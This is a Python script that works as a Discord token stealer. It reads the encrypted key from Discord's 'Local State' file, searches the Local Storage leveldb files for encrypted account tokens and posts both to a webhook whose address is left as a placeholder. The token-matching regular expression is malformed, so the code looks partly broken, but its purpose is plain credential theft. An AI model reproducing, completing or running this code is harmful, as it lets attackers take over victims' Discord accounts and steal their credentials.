import os
import json
import re
import requests
from os import listdir
from os.path import join, splitext

def read_file(filepath):
    with open(filepath, 'rb') as file:
        data = file.read()
    return data

def get_extension(filename):
    return splitext(filename)[1][1:]

def send_to_webhook(message):
    webhook_url = "/webhook/"
    headers = {'Content-Type': 'application/json'}
    payload = {'content': message}
    response = requests.post(webhook_url, headers=headers, json=payload)
    if response.status_code != 200:
        print(f"Failed to send message to Discord webhook: {response.text}")

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    discordpath_localstate = join(roaming, 'discord', 'Local State')
    discordpath_localstorage = join(roaming, 'discord', 'Local Storage', 'leveldb')

    if not os.path.exists(discordpath_localstate):
        print(f"Error: {discordpath_localstate} does not exist")
        return
    if not os.path.exists(discordpath_localstorage):
        print(f"Error: {discordpath_localstorage} does not exist")
        return

    try:
        with open(discordpath_localstate, 'rb') as file:
            discord_data = file.read().decode('utf-8')
        local_state = json.loads(discord_data)
        os_encryptkey = local_state.get('os_crypt', {}).get('encrypted_key', '')
    except Exception as e:
        print(f"Error reading local state file: {e}")
        return

    for filename in listdir(discordpath_localstorage):
        filepath = join(discordpath_localstorage, filename)
        if get_extension(filename) == 'ldb':
            try:
                ldb_data = read_file(filepath).decode('utf-8')
                encrypted_token = re.search(r'dQw4w9WgXcQ:[^.[''(.)''].$][^\\"]', ldb_data)
                if encrypted_token:
                    message = f"Os_Key: {os_encryptkey}\nEncrypted token: {encrypted_token.group()}"
                    send_to_webhook(message)
            except Exception as e:
                print(f"Error reading file {filepath}: {e}")

    print("/yourname/")

if __name__ == "__main__":
    main()
